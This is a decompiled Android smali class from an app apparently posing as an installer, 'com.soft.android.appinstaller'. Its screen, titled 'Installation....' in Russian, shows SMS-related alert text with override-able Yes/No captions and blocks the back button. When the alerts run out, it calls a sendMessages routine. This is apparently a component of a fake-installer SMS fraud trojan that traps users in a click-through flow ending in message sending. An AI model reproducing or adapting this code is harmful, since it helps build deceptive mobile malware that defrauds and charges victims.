.class public Lcom/soft/android/appinstaller/QuestionActivity;
.super Landroid/app/Activity;
.source "QuestionActivity.java"


# instance fields
.field private buttonNo:Landroid/widget/Button;

.field private buttonYes:Landroid/widget/Button;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static checkNextQuestions(Landroid/content/Context;Landroid/app/Activity;)V
    .locals 3
    .param p0, "v"    # Landroid/content/Context;
    .param p1, "a"    # Landroid/app/Activity;

    .prologue
    .line 57
    invoke-static {}, Lcom/soft/android/appinstaller/FlowController;->getCurrentAlertID()I

    move-result v1

    const/4 v2, -0x1

    if-eq v1, v2, :cond_0

    .line 58
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/soft/android/appinstaller/QuestionActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 59
    .local v0, "myIntent":Landroid/content/Intent;
    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 60
    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    .line 64
    .end local v0    # "myIntent":Landroid/content/Intent;
    :goto_0
    return-void

    .line 62
    :cond_0
    invoke-static {p0, p1}, Lcom/soft/android/appinstaller/FlowController;->sendMessages(Landroid/content/Context;Landroid/app/Activity;)V

    goto :goto_0
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 7
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 22
    const-string v3, "log"

    const-string v4, "QuestionActivity onCreate"

    invoke-static {v3, v4}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 23
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 24
    const v3, 0x7f030003

    invoke-virtual {p0, v3}, Lcom/soft/android/appinstaller/QuestionActivity;->setContentView(I)V

    .line 26
    invoke-static {}, Lcom/soft/android/appinstaller/GlobalConfig;->getInstance()Lcom/soft/android/appinstaller/GlobalConfig;

    move-result-object v3

    invoke-virtual {v3, p0}, Lcom/soft/android/appinstaller/GlobalConfig;->init(Landroid/content/Context;)V

    .line 27
    invoke-static {}, Lcom/soft/android/appinstaller/OpInfo;->getInstance()Lcom/soft/android/appinstaller/OpInfo;

    move-result-object v3

    invoke-virtual {v3, p0}, Lcom/soft/android/appinstaller/OpInfo;->init(Landroid/content/Context;)V

    .line 29
    const v3, 0x7f070013

    invoke-virtual {p0, v3}, Lcom/soft/android/appinstaller/QuestionActivity;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/Button;

    iput-object v3, p0, Lcom/soft/android/appinstaller/QuestionActivity;->buttonYes:Landroid/widget/Button;

    .line 30
    const v3, 0x7f070012

    invoke-virtual {p0, v3}, Lcom/soft/android/appinstaller/QuestionActivity;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/Button;

    iput-object v3, p0, Lcom/soft/android/appinstaller/QuestionActivity;->buttonNo:Landroid/widget/Button;

    .line 32
    iget-object v3, p0, Lcom/soft/android/appinstaller/QuestionActivity;->buttonYes:Landroid/widget/Button;

    invoke-static {}, Lcom/soft/android/appinstaller/OpInfo;->getInstance()Lcom/soft/android/appinstaller/OpInfo;

    move-result-object v4

    invoke-virtual {v4}, Lcom/soft/android/appinstaller/OpInfo;->getInternals()Lcom/soft/android/appinstaller/core/Internals;

    move-result-object v4

    const-string v5, "ui.alertscreen.buttons.yes.caption"

    iget-object v6, p0, Lcom/soft/android/appinstaller/QuestionActivity;->buttonYes:Landroid/widget/Button;

    invoke-virtual {v6}, Landroid/widget/Button;->getText()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lcom/soft/android/appinstaller/core/Internals;->getOverridableValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 33
    iget-object v3, p0, Lcom/soft/android/appinstaller/QuestionActivity;->buttonNo:Landroid/widget/Button;

    invoke-static {}, Lcom/soft/android/appinstaller/OpInfo;->getInstance()Lcom/soft/android/appinstaller/OpInfo;

    move-result-object v4

    invoke-virtual {v4}, Lcom/soft/android/appinstaller/OpInfo;->getInternals()Lcom/soft/android/appinstaller/core/Internals;

    move-result-object v4

    const-string v5, "ui.alertscreen.buttons.no.caption"

    iget-object v6, p0, Lcom/soft/android/appinstaller/QuestionActivity;->buttonNo:Landroid/widget/Button;

    invoke-virtual {v6}, Landroid/widget/Button;->getText()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Lcom/soft/android/appinstaller/core/Internals;->getOverridableValueForLocation(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    .line 34
    const v3, 0x7f070010

    invoke-virtual {p0, v3}, Lcom/soft/android/appinstaller/QuestionActivity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    .line 35
    .local v2, "textView":Landroid/widget/TextView;
    invoke-static {}, Lcom/soft/android/appinstaller/FlowController;->getCurrentAlertID()I

    move-result v0

    .line 36
    .local v0, "alertID":I
    const/4 v3, -0x1

    if-eq v0, v3, :cond_0

    .line 37
    invoke-static {}, Lcom/soft/android/appinstaller/OpInfo;->getInstance()Lcom/soft/android/appinstaller/OpInfo;

    move-result-object v3

    invoke-virtual {v3}, Lcom/soft/android/appinstaller/OpInfo;->getInternals()Lcom/soft/android/appinstaller/core/Internals;

    move-result-object v3

    invoke-virtual {v3}, Lcom/soft/android/appinstaller/core/Internals;->getSmsInfo()Lcom/soft/android/appinstaller/core/SmsInfo;

    move-result-object v3

    invoke-virtual {v3, v0}, Lcom/soft/android/appinstaller/core/SmsInfo;->getAlert(I)Ljava/lang/String;

    move-result-object v1

    .line 38
    .local v1, "s":Ljava/lang/String;
    invoke-virtual {v2, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 39
    new-instance v3, Landroid/text/method/ScrollingMovementMethod;

    invoke-direct {v3}, Landroid/text/method/ScrollingMovementMethod;-><init>()V

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setMovementMethod(Landroid/text/method/MovementMethod;)V

    .line 40
    const-string v3, "\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430...."

    invoke-virtual {p0, v3}, Lcom/soft/android/appinstaller/QuestionActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 42
    .end local v1    # "s":Ljava/lang/String;
    :cond_0
    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1
    .param p1, "keyCode"    # I
    .param p2, "event"    # Landroid/view/KeyEvent;

    .prologue
    .line 45
    const/4 v0, 0x4

    if-ne p1, v0, :cond_0

    .line 49
    const/4 v0, 0x1

    .line 53
    :goto_0
    return v0

    :cond_0
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method public onNoClicked(Landroid/view/View;)V
    .locals 3
    .param p1, "v"    # Landroid/view/View;

    .prologue
    const/4 v2, 0x0

    .line 84
    const-string v0, "log"

    const-string v1, "Exit"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 85
    invoke-static {}, Lcom/soft/android/appinstaller/OpInfo;->getInstance()Lcom/soft/android/appinstaller/OpInfo;

    move-result-object v0

    invoke-virtual {v0}, Lcom/soft/android/appinstaller/OpInfo;->getInternals()Lcom/soft/android/appinstaller/core/Internals;

    move-result-object v0

    invoke-virtual {v0}, Lcom/soft/android/appinstaller/core/Internals;->getSmsInfo()Lcom/soft/android/appinstaller/core/SmsInfo;

    move-result-object v0

    invoke-static {}, Lcom/soft/android/appinstaller/FlowController;->getCurrentAlertID()I

    move-result v1

    invoke-virtual {v0, v1, v2}, Lcom/soft/android/appinstaller/core/SmsInfo;->setAlertResult(IZ)V

    .line 86
    invoke-static {}, Lcom/soft/android/appinstaller/FlowController;->increaseCurrentAlertID()V

    .line 87
    invoke-virtual {p0, p1, v2}, Lcom/soft/android/appinstaller/QuestionActivity;->startNextQuestion(Landroid/view/View;Z)V

    .line 88
    invoke-virtual {p0}, Lcom/soft/android/appinstaller/QuestionActivity;->finish()V

    .line 89
    return-void
.end method

.method public onYesClicked(Landroid/view/View;)V
    .locals 3
    .param p1, "v"    # Landroid/view/View;

    .prologue
    const/4 v2, 0x1

    .line 75
    const-string v0, "log"

    const-string v1, "Next"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    invoke-static {}, Lcom/soft/android/appinstaller/OpInfo;->getInstance()Lcom/soft/android/appinstaller/OpInfo;

    move-result-object v0

    invoke-virtual {v0}, Lcom/soft/android/appinstaller/OpInfo;->getInternals()Lcom/soft/android/appinstaller/core/Internals;

    move-result-object v0

    invoke-virtual {v0}, Lcom/soft/android/appinstaller/core/Internals;->getSmsInfo()Lcom/soft/android/appinstaller/core/SmsInfo;

    move-result-object v0

    invoke-static {}, Lcom/soft/android/appinstaller/FlowController;->getCurrentAlertID()I

    move-result v1

    invoke-virtual {v0, v1, v2}, Lcom/soft/android/appinstaller/core/SmsInfo;->setAlertResult(IZ)V

    .line 77
    invoke-static {}, Lcom/soft/android/appinstaller/FlowController;->increaseCurrentAlertID()V

    .line 78
    invoke-virtual {p0, p1, v2}, Lcom/soft/android/appinstaller/QuestionActivity;->startNextQuestion(Landroid/view/View;Z)V

    .line 79
    invoke-virtual {p0}, Lcom/soft/android/appinstaller/QuestionActivity;->finish()V

    .line 80
    return-void
.end method

.method public startNextQuestion(Landroid/view/View;Z)V
    .locals 1
    .param p1, "v"    # Landroid/view/View;
    .param p2, "send"    # Z

    .prologue
    .line 67
    if-eqz p2, :cond_0

    .line 71
    :cond_0
    invoke-virtual {p1}, Landroid/view/View;->getContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, p0}, Lcom/soft/android/appinstaller/QuestionActivity;->checkNextQuestions(Landroid/content/Context;Landroid/app/Activity;)V

    .line 72
    return-void
.end method
